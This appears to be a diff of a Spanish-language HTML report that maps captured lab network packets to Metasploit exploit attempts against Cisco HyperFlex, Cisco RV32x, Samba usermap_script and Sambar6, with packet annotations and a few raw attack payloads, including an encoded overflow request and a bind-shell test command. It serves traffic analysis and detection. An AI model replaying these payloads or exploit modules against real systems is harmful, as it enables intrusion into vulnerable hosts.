+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico interno con intento de conexión HTTP: 172.19.0.3:36509 -> 172.19.0.2:80, respuesta SYN+ACK desde 172.19.0.2. No se observa carga útil ni comandos en capa de aplicación dentro de la ventana. Contexto indica posible uso del exploit CVE-2021-1497 contra Cisco HyperFlex, pero el rastro mostrado solo evidencia el establecimiento TCP (SYN/ACK) sin datos.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:15.563059+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 80 → 36509</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico TCP entre 172.19.0.3:36509 y 172.19.0.2:80 en la ventana de explotación de CVE-2021-1497 (módulo linux/http/cisco_hyperflex_hx_data_platform_cmd_exec). Este frame es una respuesta ACK del servidor (len=0, sin datos) en protocolo catalogado como UNKNOWN, parte de una sesión HTTP asociada al intento de RCE.</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2021-1498
+                <span class="badge">CVE-2021-1497, CVE-2021-1498, <a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR' target='_blank'>https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR</a></span>
+            </div>
+        </div>
+        <div class="summary">Entre 202</div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/cisco_hyperflex_hx_data_platform_cmd_exec</p>
+            <p><span class="field-label">Payload:</span> cmd/unix/bind_netcat</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:30:31.080533+00:00 → 2024-09-25 10:30:36.235216+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:33.462665+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 44587 → 80</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> SYN TCP desde 172.19.0.3:44587 a 172.19.0.2:80 (HTTP) dentro de la ventana del intento de explotación CVE-2021-1498 (Cisco HyperFlex); no hay datos de aplicación ni carga útil, solo inicio de conexión.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:33.462887+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload">GET /storfs-asup HTTP/1.1..Host: tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device..User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36....</div>
+                    <p><span class="field-label">IPs:</span> </p>
+                    <p><span class="field-label">Puertos:</span> </p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> </p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:33.463208+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload">HTTP/1.1 404 Not Found..Date: Wed, 25 Sep 2024 10:30:33 GMT..Server: Apache/2.2.8 (Ubuntu) DAV/2..Content-Length: 330..Content-Type: text/html; charset=iso-8859-1....<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /storfs-asup was not found on this server.</p>.<hr>.<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device Port 80</address>.</body></html>.</div>
+                    <p><span class="field-label">IPs:</span> </p>
+                    <p><span class="field-label">Puertos:</span> </p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> </p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:33.462690+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 80 → 44587</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Paquete TCP SYN+ACK desde 172.19.0.2:80 hacia 172.19.0.3:44587 en la ventana indicada, sugiriendo establecimiento de conexión HTTP posiblemente asociado al uso del exploit linux/http/cisco_hyperflex_hx_data_platform_cmd_exec (CVE-2021-1498). No se observan datos de aplicación ni comandos en este paquete.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:33.462904+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 80 → 44587</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico interno asociado a intento de explotación de Cisco HyperFlex (CVE-2021-1498) vía HTTP: paquete ACK sin carga desde 172.19.0.2:80 hacia 172.19.0.3:44587 dentro de la ventana indicada; sin datos de aplicación capturados en este segmento.</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2019-1653
+                <span class="badge">CVE-2019-1653, CVE-2019-1652, EDB-46243</span>
+            </div>
+        </div>
+        <div class="summary">Entre 2024-09-25 10:30:49 y 10:31:15, 172.19.0.3:40777 inició un sondeo/explotación contra 172.19.0.2:8007 (servicio web Cisco RV32x, CVE-2019-1653), enviando SYN TCP sin carga útil; la respuesta 172.19.0.2:8007 →</div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/cisco_rv32x_rce</p>
+            <p><span class="field-label">Payload:</span> generic/custom</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:30:49.103806+00:00 → 2024-09-25 10:31:15.510967+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:51.435213+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 40777 → 8007</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> SYN TCP desde 172.19.0.3:40777 a 172.19.0.2:8007 sin carga útil. Tráfico consistente con un sondeo/inicio de explotación del servicio web de Cisco RV32x (posible CVE-2019-1653) durante la ventana indicada.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:31:03.761941+00:00</p>
                     <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">SMB</span></p>
                     <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">...TSMBr.....................2...1..LANMAN1.0..LM1.2X002..NT LANMAN 1.0..NT LM 0.12.</div>
+                    <div class="payload">...V....... DGDFEFDHDGDCEEDCDFEBDCDHCACACAAA. FHEPFCELEHFCEPFFFACACACACACACABO.SMB%..............................J...................J.V.........[.\MAILSLOT\BROWSE.....65E762D25A27...........U65e762d25a27 server (Samba 3.0.20-Debian).</div>
                     <p><span class="field-label">IPs:</span> </p>
                     <p><span class="field-label">Puertos:</span> </p>
                     <p><span class="field-label">Comandos:</span> —</p>
@@ -134,127 +627,28 @@
             </li>
             <li class="packet">
                 <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:31.103790+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">echo UzKqd4cKwIaqwUCagTbV.</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.496539+00:00</p>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:51.435230+00:00</p>
                     <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
                     <p><span class="field-label">Payload interpretado:</span></p>
                     <div class="payload"></div>
                     <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 139 → 38293</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534, http://samba.org/samba/security/CVE-2007-2447.html</p>
-                    <p><span class="field-label">Observaciones:</span> SYN+ACK desde 172.19.0.2:139 hacia 172.19.0.3:38293 durante intento de explotación multi/samba/usermap_script (OSVDB-34700/CVE-2007-2447). Tráfico TCP en NetBIOS/SMB (139) sin carga de aplicación; fase de establecimiento de conexión dentro de la ventana indicada.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.496549+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 38293 → 139</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534, http://samba.org/samba/security/CVE-2007-2447.html</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico relacionado con intento de explotación de Samba (CVE-2007-2447, OSVDB-34700) mediante multi/samba/usermap_script. Paquete TCP ACK sin datos (len=0) desde 172.19.0.3:38293 hacia 172.19.0.2:139 (NetBIOS/SMB), dentro de la sesión (stream 310) durante la ventana 2024-10-17 10:07:27Z a 10:07:43Z.</p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2007-2447
-                <span class="badge">CVE-2007-2447, OSVDB-34700, BID-23972</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024-10-17 10:07:27.278946+00:00 y 10:07:43.435071+00:00, 172.19.0.3 inició explotación de Samba (CVE-2007-2447, usermap_script) contra 172.19.0.2 mediante módulo Metasploit multi/samba/usermap_script y payload cmd/unix/bind_netcat (shell w,r). Secuencia: SYN 172.19.0.3:38293 → 172.19.0.2:139, SYN+ACK de 172.19.0.2:139, ACK; negociación SMB con payload 00:00:00:54:ff:53:4d:42:72... Posteriormente, interacción al puerto 2425/tcp de la víctima desde 172.19.0.3:40103 (bind shell netcat) enviando comando/payload “echo UzKqd4cKwIaqwUCagTbV” (6563686f...0a). Actividad su</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> multi/samba/usermap_script</p>
-            <p><span class="field-label">Payload:</span> cmd/unix/bind_netcat</p>
-            <p><span class="field-label">Shell Type:</span> w, r</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 10:07:27.278946+00:00 → 2024-10-17 10:07:43.435071+00:00</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.496525+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 38293 → 139</p>
+                    <p><span class="field-label">Puertos:</span> 8007 → 40777</p>
                     <p><span class="field-label">Comandos:</span> —</p>
                     <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> SYN TCP desde 172.19.0.3:38293 a 172.19.0.2:139 (NetBIOS/SMB), inicio de sesión para posible explotación de Samba (CVE-2007-2447, usermap_script) en la ventana indicada; sin carga útil de aplicación en este paquete.</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico TCP con protocolo de aplicación desconocido: 172.19.0.2:8007 -> 172.19.0.3:40777 genera RST/ACK inmediato sin datos (len=0), cerrando la conexión durante el intento inicial. No se observan cargas útiles, comandos ni URLs.</p>
                 </div>
             </li>
             <li class="packet">
                 <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.497055+00:00</p>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:31:03.762136+00:00</p>
                     <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">SMB</span></p>
                     <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">...TSMBr.....................2...1..LANMAN1.0..LM1.2X002..NT LANMAN 1.0..NT LM 0.12.</div>
+                    <div class="payload">...W....... DGDFEFDHDGDCEEDCDFEBDCDHCACACAAA. ABACFPFPENFDECFCEPFHFDEFFPFPACAB.SMB%..............................-...................-.V.........>.\MAILSLOT\BROWSE.....WORKGROUP..............U65E762D25A27.</div>
                     <p><span class="field-label">IPs:</span> </p>
                     <p><span class="field-label">Puertos:</span> </p>
                     <p><span class="field-label">Comandos:</span> —</p>
                     <p><span class="field-label">URLs:</span> —</p>
                     <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:31.103790+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">echo UzKqd4cKwIaqwUCagTbV.</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 40103 → 2425</p>
-                    <p><span class="field-label">Comandos:</span> echo UzKqd4cKwIaqwUCagTbV</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Durante la ventana indicada se observa tráfico TCP (UNKNOWN) desde 172.19.0.3:40103 hacia 172.19.0.2:2425 con un payload que ejecuta el comando 'echo UzKqd4cKwIaqwUCagTbV'. Correlacionado con el uso del exploit multi/samba/usermap_script (CVE-2007-2447) en una sesión de pentesting.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.496539+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 139/tcp → 38293/tcp</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Respuesta SYN+ACK desde 172.19.0.2:139 a 172.19.0.3:38293, indicando servicio SMB/NetBIOS accesible en el contexto de intento de explotación de Samba (CVE-2007-2447, exploit multi/samba/usermap_script) durante la ventana indicada. Sin datos de aplicación en este paquete (len=0).</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.496549+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 38293 → 139</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico TCP 172.19.0.3→172.19.0.2 hacia puerto 139 (NetBIOS/SMB). Paquete ACK sin carga útil. Evento dentro de la ventana de explotación de Samba usermap_script (CVE-2007-2447).</p>
                 </div>
             </li>
         </ul>
@@ -263,608 +657,45 @@
         <div class="exploit-header">
             <div class="exploit-icon">🛡️</div>
             <div class="exploit-title">
-                OSVDB-5786
-                <span class="badge">CVE-2004-2086, OSVDB-5786, BID-9607</span>
+                CVE-2019-1652
+                <span class="badge">CVE-2019-1653, CVE-2019-1652, EDB-46243</span>
             </div>
         </div>
-        <div class="summary">Entre 2024-10-17 10:07:52 y 10:08:05, el host 172.19.0.3 lanzó el exploit windows/http/sambar6_search_results (OSVDB-5786, CVE-2004-2086) contra 172.19.0.2 vía HTTP: SYN 172.19.0.3:36859→172.19.0.2:80, POST /search/results.stm con Content-Length: 188 y query=hh3w4XXXXXXXX…ctcthh3w4 (hex inicio/fin: 68 68 33 77 34 … 63 74 63 74 68 68 33 77 34), encabezados anómalos “BAKA7KCF…”. Respuesta: HTTP/1.1 404 Not Found (Apache/2.2.8). Posteriormente, tráfico TCP 172.19.0.</div>
+        <div class="summary">Entre 2024-09-25 10:31:28.058448+00:00 y 10:31:54.479832+00:00 se observó sondeo TCP del host 172.19.0.3:43187 hacia 172.19.0.2:8007 (SYN) seguido de respuesta RST desde 172.19.0.2:8007 a 172.19.0.3:43187, sin transferencia de datos (len=0). Actividad coherente con pruebas del exploit linux/http/cisco_rv32x_rce (CVE-2019-1652/CVE-2019-1653) posiblemente vía Metasploit; payload: generic/custom; protocolo: TCP; sin comandos, URLs ni shell establecida. Secuencia: escaneo/intentona de conexión al servicio en 8007 y reseteo inmediato, lo que sugiere reconocimiento fallido o bloqueo del endpoint. Suspicioso por puerto 8007 expuesto.</div>
         <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> windows/http/sambar6_search_results</p>
-            <p><span class="field-label">Payload:</span> generic/custom</p>
-            <p><span class="field-label">Shell Type:</span> w</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 10:07:52.963047+00:00 → 2024-10-17 10:08:05.203944+00:00</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.760380+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 36859 → 80</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> SYN TCP desde 172.19.0.3:36859 a 172.19.0.2:80 iniciando conexión HTTP en ventana del ataque (exploit windows/http/sambar6_search_results, OSVDB-5786/CVE-2004-2086); sin datos de aplicación aún.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.762275+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">GHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Accept-Ranges: BAKA7KCFGAFOA7J7GKNINBB@OHJJKCIKNH@B@C'B@GIHCBHFNCA7CJOJ7JIBB'7FKIGKAFJGKNG'G7BJOOHHC7BCGFH'F'IOFBKBH''7AFGJ@ON.NHNG7O@NFOCGAK7OCICIC''JFFJJ7F@'KKJGCNKBO'@NAOO'CNACOF7HKNNFIBB@.7.@NIICA'JOJKF'@G7C'AOJNOGHFHNCHAFHAOBOGOCO'@IK..7@GCO7O7BIOHO'B@KN7'JJJNGAKBBAAC.IJNBFA'OG.FAHAAKOK7A'7CC'OBOCIOJ'AGBKAINBK@.'AAC7CBBJJHBKGKNCIB7'AJ'N.G@CGGJGH'NO@@INACHJOONF'KJFFGGGNOB7ACHGAGAAKBKN.F@OJGCK7NJOFOG.H@J'AI7OJGOKC@OOKJBGC'AOIO7NHA7HNJI7BCOHHNBFKCOG'@INCCHOI@K@7NC.IN'GJFN'NBNOFJNK@N'BKKIA'CBNI@H'GIIBC7J@.K'A7@FAHIGACOINCAA.JBAH7BIKAB'C77CGHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Referrer: BAKA7KCFGAFOA7J7GKNINBB@OHJJKCIKNH@B@C'B@GIHCBHFNCA7CJOJ7JIBB'7FKIGKAFJGKNG'G7BJOOHHC7BCGFH'F'IOFBKBH''7AFGJ@ON.NHNG7O@NFOCGAK7OCICIC''JFFJJ7F@'KKJGCNKBO'@NAOO'CNACOF7HKNNFIBB@.7.@NIICA'JOJKF'@G7C'AOJNOGHFHNCHAFHAOBOGOCO'@IK..7@GCO7O7BIOHO'B@KN7'JJJNGAKBBAAC.IJNBFA'OG.FAHAAKOK7A'7CC'OBOCIOJ'AGBKAINBK@.'AAC7CBBJJHBKGKNCIB7'AJ'N.G@CGGJGH'NO@@INACHJOONF'KJFFGGGNOB7ACHGAGAAKBKN.F@OJGCK7NJOFOG.H@J'AI7OJGOKC@OOKJBGC'AOIO7NHA7HNJI7BCOHHNBFKCOG'@INCCHOI@K@7NC.IN'GJFN'NBNOFJNK@N'BKKIA'CBNI@H'GIIBC7J@.K'A7@FAHIGACOINCAA.JBAH7BIKAB'C77CGHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Connection: Keep-Alive..Pragma: no-cache..Content-Type: BAKA7KCFGAFOA7J7GKNINBB@OHJJKCIKNH@B@C'B@GIHCBHFNCA7CJOJ7JIBB'7FKIGKAFJGKNG'G7BJOOHHC7BCGFH'F'IOFBKBH''7AFGJ@ON.NHNG7O@NFOCGAK7OCICIC''JFFJJ7F@'KKJGCNKBO'@NAOO'CNACOF7HKNNFIBB@.7.@NIICA'JOJKF'@G7C'AOJNOGHFHNCHAFHAOBOGOCO'@IK..7@GCO7O7BIOHO'B@KN7'JJJNGAKBBAAC.IJNBFA'OG.FAHAAKOK7A'7CC'OBOCIOJ'AGBKAINBK@.'AAC7CBBJJHBKGKNCIB7'AJ'N.G@CGGJGH'NO@@INACHJOONF'KJFFGGGNOB7ACHGAGAAKBKN.F@OJGCK7NJOFOG.H@J'AI7OJGOKC@OOKJBGC'AOIO7NHA7HNJI7BCOHHNBFKCOG'@INCCHOI@K@7NC.IN'GJFN'NBNOFJNK@N'BKKIA'CBNI@H'GIIBC7J@.K'A7@FAHIGACOINCAA.JBAH7BIKAB'C77CGHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Content-Length: 188....style=page&spage=0&indexname=docs&query=hh3w4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXctcthh3w4</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.762481+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
